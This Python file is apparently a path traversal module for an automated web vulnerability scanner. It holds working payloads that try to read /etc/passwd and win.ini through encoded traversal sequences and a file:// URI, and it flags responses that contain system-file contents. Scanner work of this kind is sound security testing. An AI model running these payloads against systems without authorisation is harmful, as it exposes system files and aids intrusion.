from awap.engines.attack.base import AttackModule


class PathTraversalModule(AttackModule):
    module_id = "path_traversal"
    vuln_class = "PATH_TRAVERSAL"

    PAYLOADS = [
        "../../../../../../../../../../etc/passwd",
        "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "....//....//....//....//etc/passwd",
        "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "file:///etc/passwd",
    ]
    INDICATORS = ["root:x:0:0:", "[extensions]", "[fonts]"]

    async def run(self, url: str, params: list[dict], context=None) -> list[dict]:
        findings = []
        for param in params:
            for payload in self.PAYLOADS:
                try:
                    resp, meta = await self.send_payload(
                        url, "GET", payload, param["name"], param["type"], context
                    )
                    if not resp:
                        continue
                    body = resp.text
                    for ind in self.INDICATORS:
                        if ind in body:
                            findings.append({
                                "vuln_class": "PATH_TRAVERSAL",
                                "url": url,
                                "method": "GET",
                                "param": param["name"],
                                "payload": payload,
                                "evidence": f"System file artifact: {ind}",
                                "severity": "HIGH",
                                "cvss": 7.5,
                                "request_raw": meta.get("request_raw"),
                                "response_raw": meta.get("response_raw"),
                            })
                            break
                except Exception:
                    pass
        return findings
